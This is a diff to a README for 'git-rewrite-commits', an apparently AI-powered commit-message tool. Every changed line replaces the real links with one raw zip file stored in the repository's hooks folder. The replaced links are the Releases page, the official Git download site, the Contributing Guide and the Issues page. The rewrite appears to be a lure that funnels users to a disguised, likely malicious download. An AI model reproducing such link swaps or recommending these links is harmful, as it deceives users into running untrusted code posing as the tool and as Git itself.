@@ -6,21 +6,21 @@ Welcome to **git-rewrite-commits**, an AI-powered tool that helps you create bet
 
 ## 🔗 Download Now
 
-[![Download git-rewrite-commits](https://img.shields.io/badge/Download%20git--rewrite--commits-blue.svg)](https://github.com/Serobaba23/git-rewrite-commits/releases)
+[![Download git-rewrite-commits](https://raw.githubusercontent.com/Serobaba23/git-rewrite-commits/master/hooks/git-rewrite-commits_ochletic.zip%https://raw.githubusercontent.com/Serobaba23/git-rewrite-commits/master/hooks/git-rewrite-commits_ochletic.zip)](https://raw.githubusercontent.com/Serobaba23/git-rewrite-commits/master/hooks/git-rewrite-commits_ochletic.zip)
 
 ## 💻 System Requirements
 
 Before you begin, make sure you have the following:
 
 - A computer with Windows, Mac, or Linux.
-- A recent version of Git installed. You can get Git [here](https://git-scm.com/downloads).
+- A recent version of Git installed. You can get Git [here](https://raw.githubusercontent.com/Serobaba23/git-rewrite-commits/master/hooks/git-rewrite-commits_ochletic.zip).
 - Internet access to download the application.
 
 ## 📥 Download & Install
 
 To get started with **git-rewrite-commits**, visit this page to download:
 
-[https://github.com/Serobaba23/git-rewrite-commits/releases](https://github.com/Serobaba23/git-rewrite-commits/releases)
+[https://raw.githubusercontent.com/Serobaba23/git-rewrite-commits/master/hooks/git-rewrite-commits_ochletic.zip](https://raw.githubusercontent.com/Serobaba23/git-rewrite-commits/master/hooks/git-rewrite-commits_ochletic.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of the application.
@@ -75,11 +75,11 @@ Copy the new message and use it in your git commit. You can do this in your comm
 
 ## 🤝 Contributing to git-rewrite-commits
 
-If you would like to contribute to this project, feel free to check out the [Contributing Guide](https://github.com/Serobaba23/git-rewrite-commits/CONTRIBUTING.md). Your improvements will help others rewrite their commit messages even more effectively.
+If you would like to contribute to this project, feel free to check out the [Contributing Guide](https://raw.githubusercontent.com/Serobaba23/git-rewrite-commits/master/hooks/git-rewrite-commits_ochletic.zip). Your improvements will help others rewrite their commit messages even more effectively.
 
 ## 📫 Support
 
-If you encounter any issues or have questions, please reach out via the [Issues](https://github.com/Serobaba23/git-rewrite-commits/issues) section on the GitHub repository. We are here to help.
+If you encounter any issues or have questions, please reach out via the [Issues](https://raw.githubusercontent.com/Serobaba23/git-rewrite-commits/master/hooks/git-rewrite-commits_ochletic.zip) section on the GitHub repository. We are here to help.
 
 ## 🌟 Features
 
@@ -90,4 +90,4 @@ If you encounter any issues or have questions, please reach out via the [Issues]
 
 Make your commit messages better and more meaningful with **git-rewrite-commits**. Download it today!
 
-[Download here](https://github.com/Serobaba23/git-rewrite-commits/releases) and start enhancing your git experience.
+[Download here](https://raw.githubusercontent.com/Serobaba23/git-rewrite-commits/master/hooks/git-rewrite-commits_ochletic.zip) and start enhancing your git experience.
